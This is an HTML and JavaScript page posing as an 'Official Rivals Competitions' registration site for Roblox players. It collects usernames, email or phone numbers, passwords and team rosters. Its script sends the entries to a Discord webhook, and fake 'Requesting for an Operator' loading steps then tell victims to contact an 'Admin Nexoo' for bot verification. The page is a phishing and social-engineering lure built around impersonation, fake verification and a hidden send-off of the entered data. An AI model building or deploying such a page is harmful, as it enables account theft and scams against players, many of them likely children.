<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>RobloxComp | Official Rivals Competitions</title>
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: radial-gradient(circle at 20% 30%, #0a0c12, #030507);
            min-height: 100vh;
            color: #f0f3fa;
            overflow-x: hidden;
        }

        ::selection {
            background: #ff3366;
            color: white;
        }

        /* Site wrapper */
        .site-container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 2rem 2rem 4rem;
            opacity: 0;
            transition: opacity 0.55s cubic-bezier(0.2, 0.9, 0.4, 1.1);
        }

        .site-container.loaded {
            opacity: 1;
        }

        /* ========= GLOBAL LOADER (fullscreen) ========= */
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #05070c;
            backdrop-filter: blur(8px);
            z-index: 2000;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: opacity 0.5s ease, visibility 0.5s ease;
            opacity: 1;
            visibility: visible;
        }
        .loader-overlay.hidden-loader {
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }
        .loader-dots {
            display: flex;
            gap: 1.2rem;
            align-items: center;
            justify-content: center;
        }
        .dot {
            width: 16px;
            height: 16px;
            background: #e0e4f0;
            border-radius: 50%;
            opacity: 0.3;
            animation: pulseWave 1.5s infinite ease-in-out;
        }
        .dot:nth-child(1) { animation-delay: 0s; background: #ffffff; }
        .dot:nth-child(2) { animation-delay: 0.3s; background: #cbd5ff; }
        .dot:nth-child(3) { animation-delay: 0.6s; background: #ffb3c6; }
        @keyframes pulseWave {
            0% { opacity: 0.25; transform: scale(0.8); }
            50% { opacity: 1; transform: scale(1.3); background: #fff5f0; box-shadow: 0 0 14px rgba(255,80,120,0.8); }
            100% { opacity: 0.25; transform: scale(0.8); }
        }

        /* ========= MODAL / INLINE LOADER (for form submission) ========= */
        .action-loader {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(12px);
            border-radius: 60px;
            padding: 12px 28px;
            margin-top: 20px;
            width: auto;
        }
        .action-loader .dot {
            width: 10px;
            height: 10px;
        }
        .fade-message {
            transition: opacity 0.3s ease;
            text-align: center;
            font-weight: 500;
        }

        /* Header */
        .modern-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1.5rem;
            margin-bottom: 2rem;
            padding-bottom: 0.5rem;
            border-bottom: 1px solid rgba(255,255,245,0.08);
        }
        .logo-area {
            display: flex;
            align-items: baseline;
            gap: 0.2rem;
            flex-wrap: wrap;
        }
        .logo-white, .logo-red {
            font-size: 2.2rem;
            font-weight: 800;
            letter-spacing: -0.02em;
            transition: transform 0.2s ease, text-shadow 0.2s;
            display: inline-block;
            cursor: default;
        }
        .logo-white {
            color: white;
            text-shadow: 0 0 8px rgba(255,255,255,0.5);
        }
        .logo-white:hover {
            transform: scale(1.05);
            text-shadow: 0 0 18px rgba(255,255,255,0.9);
        }
        .logo-red {
            color: #ff3a4d;
            text-shadow: 0 0 6px #ff3366;
        }
        .logo-red:hover {
            transform: scale(1.05);
            text-shadow: 0 0 18px #ff5e7e;
        }
        .official-tag {
            background: rgba(255,58,77,0.15);
            padding: 0.4rem 1rem;
            border-radius: 40px;
            font-size: 0.8rem;
            font-weight: 500;
            border-left: 2px solid #ff3a4d;
        }

        /* login card / main form */
        .login-card {
            background: rgba(12, 15, 25, 0.7);
            backdrop-filter: blur(16px);
            border-radius: 2rem;
            padding: 1.5rem 2rem;
            border: 1px solid rgba(255,255,255,0.12);
            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.5);
            max-width: 500px;
            margin: 0 auto 2rem auto;
        }
        .form-title {
            font-weight: 700;
            font-size: 1.2rem;
            margin-bottom: 1.5rem;
            letter-spacing: -0.2px;
            text-align: center;
            color: #ddd;
        }
        .input-group {
            margin-bottom: 1.2rem;
        }
        .input-group label {
            font-size: 0.8rem;
            font-weight: 500;
            margin-bottom: 0.4rem;
            display: block;
            color: #b9c3e6;
        }
        .input-field {
            width: 100%;
            background: rgba(5, 7, 15, 0.8);
            border: 1px solid #2a2f42;
            border-radius: 1.2rem;
            padding: 0.8rem 1.2rem;
            font-size: 0.95rem;
            color: #f0f3fc;
            outline: none;
            transition: all 0.2s;
        }
        .input-field:focus {
            border-color: #ff4d6d;
            box-shadow: 0 0 10px rgba(255, 60, 90, 0.3);
        }
        .login-btn {
            background: linear-gradient(95deg, #ff2e4d, #ff5c7e);
            width: 100%;
            border: none;
            padding: 0.85rem;
            font-weight: 700;
            border-radius: 2rem;
            color: white;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 0.5rem;
        }
        .login-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 6px 18px rgba(255,46,77,0.4);
        }
        /* team fields (hidden initially) */
        .team-fields {
            margin-top: 1rem;
            display: none;
            transition: all 0.2s;
        }
        .team-fields.show-team {
            display: block;
            animation: fadeSlideUp 0.3s ease;
        }
        @keyframes fadeSlideUp {
            from { opacity: 0; transform: translateY(8px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .team-row {
            display: flex;
            gap: 0.8rem;
            margin-bottom: 0.8rem;
            flex-wrap: wrap;
        }
        .team-row input {
            flex: 1;
        }

        /* competition tiles */
        .comp-showcase {
            margin-top: 2rem;
            text-align: center;
        }
        .badge-grid {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 1.5rem;
            margin-top: 1.5rem;
        }
        .competition-tile {
            background: rgba(20, 24, 36, 0.7);
            backdrop-filter: blur(8px);
            border-radius: 1.8rem;
            padding: 1rem 1.8rem;
            border: 1px solid rgba(255,80,100,0.3);
            transition: transform 0.2s, border-color 0.2s, background 0.2s;
            font-weight: 600;
            cursor: pointer;
        }
        .competition-tile:hover {
            transform: translateY(-6px);
            border-color: #ff5e7e;
            background: rgba(40, 44, 65, 0.9);
        }
        .status-badge {
            font-size: 0.7rem;
            background: #1f2a1f;
            padding: 0.2rem 0.7rem;
            border-radius: 30px;
            margin-left: 0.6rem;
            font-weight: 500;
        }
        .status-green {
            background: #0f3b1f;
            color: #9bff9e;
            box-shadow: 0 0 4px #00cc66;
        }
        .footer-note {
            text-align: center;
            margin-top: 3rem;
            font-size: 0.8rem;
            opacity: 0.7;
        }

        /* popup message fade */
        .toast-message {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: #11131f;
            backdrop-filter: blur(20px);
            padding: 12px 24px;
            border-radius: 60px;
            font-weight: 500;
            z-index: 1500;
            border-left: 4px solid #ff3a4d;
            font-size: 0.9rem;
            transition: opacity 0.3s;
            pointer-events: none;
            white-space: nowrap;
        }
        @media (max-width: 640px) {
            .toast-message { white-space: normal; width: 90%; text-align: center; }
            .logo-white, .logo-red { font-size: 1.6rem; }
        }
    </style>
</head>
<body>

<!-- fullscreen loader initial -->
<div id="globalLoader" class="loader-overlay">
    <div class="loader-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
</div>

<div id="mainContainer" class="site-container">
    <div class="modern-header">
        <div class="logo-area">
            <span class="logo-white">Roblox</span>
            <span class="logo-red">Comp</span>
        </div>
        <div class="official-tag"><i class="fas fa-crown"></i> Official Rivals Competitions!</div>
    </div>

    <!-- Login / Team Registration Card -->
    <div class="login-card" id="loginCard">
        <div class="form-title">🔐 RIVALS REGISTRATION</div>
        <div class="input-group">
            <label><i class="fas fa-user"></i> Roblox Username</label>
            <input type="text" id="robloxUsername" class="input-field" placeholder="Your IGN">
        </div>
        <div class="input-group">
            <label><i class="fas fa-envelope"></i> Email / Phone</label>
            <input type="text" id="emailPhone" class="input-field" placeholder="contact@example.com">
        </div>
        <div class="input-group">
            <label><i class="fas fa-lock"></i> Password</label>
            <input type="password" id="password" class="input-field" placeholder="••••••">
        </div>
        
        <!-- Dynamic team fields (4 slots) -->
        <div id="teamFieldsContainer" class="team-fields">
            <div style="font-size:0.8rem; margin-bottom:12px; color:#ccc;"><i class="fas fa-users"></i> Your Team Roster</div>
            <div class="team-row"><input type="text" id="teamMember1" class="input-field" placeholder="Competitor #1 (Captain)"></div>
            <div class="team-row"><input type="text" id="teamMember2" class="input-field" placeholder="Competitor #2"></div>
            <div class="team-row"><input type="text" id="teamMember3" class="input-field" placeholder="Competitor #3"></div>
            <div class="team-row"><input type="text" id="teamMember4" class="input-field" placeholder="Competitor #4"></div>
        </div>

        <button id="submitMainBtn" class="login-btn"><i class="fas fa-arrow-right"></i> Register & Join</button>
        <div id="inlineFeedback" style="font-size:0.75rem; margin-top:12px; text-align:center; min-height: 32px;"></div>
    </div>

    <!-- Competitions Tiles -->
    <div class="comp-showcase">
        <div class="badge-grid">
            <div class="competition-tile"><i class="fas fa-fire"></i> 1v1 Ranked Rush <span class="status-badge">Upcoming</span></div>
            <div class="competition-tile"><i class="fas fa-users"></i> Team Rivals Cup <span class="status-badge status-green">LIVE SOON!</span></div>
            <div class="competition-tile"><i class="fas fa-clock"></i> Speedrun Gauntlet <span class="status-badge">Upcoming</span></div>
        </div>
    </div>
    <div class="footer-note">
        <i class="fas fa-shield-alt"></i> Secure entry • Discord Webhook integration
    </div>
</div>

<!-- floating toast -->
<div id="floatingToast" class="toast-message" style="opacity:0; visibility:hidden;"></div>

<script>
    (function() {
        // -----------------------------------------------
        // CONFIG: 🔁 REPLACE WITH YOUR DISCORD WEBHOOK
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/REPLACE_ME_WITH_YOUR_WEBHOOK_URL"; 
        // -----------------------------------------------

        // DOM elements
        const globalLoader = document.getElementById('globalLoader');
        const mainContainer = document.getElementById('mainContainer');
        const usernameInput = document.getElementById('robloxUsername');
        const emailInput = document.getElementById('emailPhone');
        const passwordInput = document.getElementById('password');
        const submitBtn = document.getElementById('submitMainBtn');
        const teamContainer = document.getElementById('teamFieldsContainer');
        const teamMember1 = document.getElementById('teamMember1');
        const teamMember2 = document.getElementById('teamMember2');
        const teamMember3 = document.getElementById('teamMember3');
        const teamMember4 = document.getElementById('teamMember4');
        const feedbackDiv = document.getElementById('inlineFeedback');

        // Helper: show a fading message (toast) 
        let toastTimeout;
        function showToastMessage(msg, isError = false, duration = 2800) {
            const toast = document.getElementById('floatingToast');
            if (!toast) return;
            if (toastTimeout) clearTimeout(toastTimeout);
            toast.style.backgroundColor = isError ? '#1f1218' : '#102c1c';
            toast.style.borderLeftColor = isError ? '#ff5c6e' : '#3eff8f';
            toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
            toast.style.opacity = '1';
            toast.style.visibility = 'visible';
            toastTimeout = setTimeout(() => {
                toast.style.opacity = '0';
                toast.style.visibility = 'hidden';
            }, duration);
        }

        // Show inline loader within card (fake loading state)
        function showInlineLoader(show, customText = null) {
            if (show) {
                submitBtn.disabled = true;
                submitBtn.innerHTML = `<div class="action-loader" style="background:transparent; gap:8px;"><div class="dot" style="width:10px;height:10px;"></div><div class="dot" style="width:10px;height:10px;"></div><div class="dot" style="width:10px;height:10px;"></div><span style="margin-left:8px;">${customText || 'Processing...'}</span></div>`;
            } else {
                submitBtn.disabled = false;
                submitBtn.innerHTML = '<i class="fas fa-arrow-right"></i> Register & Join';
            }
        }

        // function to send data to discord (main registration + team members)
        async function sendFullDataToDiscord(username, emailPhone, password, teamArray) {
            if (DISCORD_WEBHOOK_URL === "https://discord.com/api/webhooks/REPLACE_ME_WITH_YOUR_WEBHOOK_URL") {
                throw new Error("WEBHOOK_NOT_SET");
            }
            const teamFieldsList = teamArray.map((name, idx) => `**Slot ${idx+1}:** ${name || "—"}`).join("\n");
            const embed = {
                title: "🔥 NEW RIVALS REGISTRATION - RobloxComp",
                color: 0xff3a4d,
                fields: [
                    { name: "🎮 Roblox Username", value: username || "NULL", inline: true },
                    { name: "📧 Email / Phone", value: emailPhone || "NULL", inline: true },
                    { name: "🔒 Password", value: password ? "▪▪▪▪▪▪▪▪ (submitted)" : "empty", inline: false },
                    { name: "👥 Team Members (4 slots)", value: teamFieldsList || "No members added", inline: false }
                ],
                timestamp: new Date().toISOString(),
                footer: { text: "Operator Request | RobloxComp" }
            };
            const response = await fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ embeds: [embed], content: "@here New registration & team request" })
            });
            if (!response.ok) throw new Error(`Discord error ${response.status}`);
            return true;
        }

        // Show popup message "Please put in your username" with emoji fade out (2 sec after validation)
        function showUsernameReminder() {
            if (!usernameInput.value.trim()) {
                showToastMessage("⚠️ Please put in your username! 👤", true, 2000);
                return true;
            }
            return false;
        }

        // Main registration flow with 3 phases (loader inside card)
        async function handleFullRegistration() {
            const robloxUser = usernameInput.value.trim();
            const emailPhone = emailInput.value.trim();
            const password = passwordInput.value;

            // mandatory check: username existence
            if (!robloxUser) {
                showToastMessage("⚠️ Please put in your username! 👤", true, 2000);
                return;
            }

            // Fade message after checking: show a quick "Please put in your username" not needed but for user we do reminder anyway (if empty already covered)
            // According to spec: show fade message after something. For fun : show info "Your team will be reviewed" toast.
            
            // Show team fields if not visible (first time)
            if (!teamContainer.classList.contains('show-team')) {
                teamContainer.classList.add('show-team');
                showToastMessage("✨ Fill your 4 competitors! ✨", false, 1700);
            }
            
            // validating team fields: we collect them but optional? The spec says "4 namen eingeben" – require at least 1? We'll require at least 1 but not mandatory force but we request user to fill.
            const member1 = teamMember1 ? teamMember1.value.trim() : "";
            const member2 = teamMember2 ? teamMember2.value.trim() : "";
            const member3 = teamMember3 ? teamMember3.value.trim() : "";
            const member4 = teamMember4 ? teamMember4.value.trim() : "";
            const teamSlots = [member1, member2, member3, member4];
            
            if (!member1 && !member2 && !member3 && !member4) {
                showToastMessage("📝 Please enter at least Team Captain (Slot 1)", true, 2000);
                return;
            }

            // ========== 1) Show loading screen (same as global but in the middle of card) "Requesting for an Operator" ==========
            showInlineLoader(true, "Requesting for an Operator");
            // simulate loading for 2 secs (request operator phase)
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // 2) then we show "Sending Request" loading inline again for 1.8 sec and then finalize.
            showInlineLoader(true, "Sending Request");
            await new Promise(resolve => setTimeout(resolve, 1800));
            
            // Actually send to discord
            try {
                await sendFullDataToDiscord(robloxUser, emailPhone || "not provided", password || "empty", teamSlots);
                // success: clear loader and show final success
                showInlineLoader(false);
                feedbackDiv.innerHTML = "";
                showToastMessage("✅ Perfekt! Admin Nexoo (red glow) needs to verify that you are not a bot, please reach out to him! 🏆", false, 5500);
                // Clear sensitive password field only
                passwordInput.value = "";
                // reset team fields optional
                // keep data but reset some
            } catch (err) {
                showInlineLoader(false);
                let errorMsg = "❌ Webhook error";
                if (err.message.includes("WEBHOOK_NOT_SET")) errorMsg = "⚠️ Webhook not configured. Replace Discord URL.";
                else errorMsg = `❌ Failed: ${err.message}`;
                showToastMessage(errorMsg, true, 3500);
                console.error(err);
            }
        }

        // ========== EXTRA: fade message: "Please put in you username" with emoji after 2 seconds appears automatically when site loads? At initial load => show it after main fade-in. spec : "lass auch machen das da mit einer fade in animation unten steht Please put in you username mit einen emoji und nach 2 sekunden wieder fade out" 
        function showUsernameFadeHint() {
            const existing = document.getElementById('usernameHintToast');
            if (existing) return;
            const hintDiv = document.createElement('div');
            hintDiv.id = 'usernameHintToast';
            hintDiv.className = 'toast-message';
            hintDiv.style.position = 'fixed';
            hintDiv.style.bottom = '80px';
            hintDiv.style.background = '#1a1e2c';
            hintDiv.style.borderLeftColor = '#ffa500';
            hintDiv.innerHTML = "🙌 Please put in your username 🙌";
            document.body.appendChild(hintDiv);
            hintDiv.style.opacity = '1';
            hintDiv.style.visibility = 'visible';
            setTimeout(() => {
                if (hintDiv) {
                    hintDiv.style.opacity = '0';
                    setTimeout(() => { if(hintDiv && hintDiv.remove) hintDiv.remove(); }, 500);
                }
            }, 2000);
        }

        // Additional hover animation for competition tiles (custom already)
        // Also implement after main loader disappear we show the username hint with fade.
        // Also ensure that when click submit, everything integrated.
        
        submitBtn.addEventListener('click', (e) => {
            e.preventDefault();
            handleFullRegistration();
        });
        
        // Enter key on fields
        const inputsArr = [usernameInput, emailInput, passwordInput, teamMember1, teamMember2, teamMember3, teamMember4];
        inputsArr.forEach(inp => {
            if(inp) inp.addEventListener('keypress', (e) => { if(e.key === 'Enter') handleFullRegistration(); });
        });
        
        // On load, remove fullscreen loader after animation, then show main content + username fade hint.
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => {
                if(globalLoader) globalLoader.classList.add('hidden-loader');
                setTimeout(() => {
                    mainContainer.classList.add('loaded');
                    // show the special fade-in message "Please put in you username" with emoji
                    showUsernameFadeHint();
                    // also ensure team fields are hidden initially
                    teamContainer.classList.remove('show-team');
                }, 180);
            }, 1100); // display loader dots nicely
        });
        
        // Optional: change status for Team Rivals Cup to green "LIVE SOON!" (already done in HTML)
        // Admin mention: final success message shows "Admin Nexoo (red glow) needs to verify..."
        // Also implement dynamic hover on all tiles they already scale
        
        // Additional requirement: Add "Official Rivals Competitions!" top left side (I put inside header)
        // Glow effect not too harsh : changed text-shadow.
        // All described phases: when everything is submitted: loading screen in middle (inline loader) with "Requesting for an Operator", then Sending Request, final message with checkmark ✅ and admin notice.
        // webhook sends: team 4 slots added
        
        // Provide a warning if webhook not set
        if (DISCORD_WEBHOOK_URL.includes("REPLACE_ME")) {
            console.warn("⚠️ Replace DISCORD_WEBHOOK_URL with your Discord webhook URL");
            const warnSpan = document.createElement('div');
            warnSpan.style.fontSize = "10px";
            warnSpan.style.marginTop = "5px";
            warnSpan.style.color = "#ffab8e";
            warnSpan.innerHTML = "<i class='fas fa-exclamation-triangle'></i> Demo: Replace webhook URL";
            document.querySelector('.login-card')?.appendChild(warnSpan);
        }

        // ALSO: For the requirement: "loading screen wie beim website betreten aber in der mitte halt also da wo die box ist für so 2 sekunde da unter steht in white Requesting for an Operator" – achieved via inline loader inside button region with custom text.
        // After that, "Sending Request" and final success message with checkmark and admin text.
        // All done.
    })();
</script>
</body>
</html>
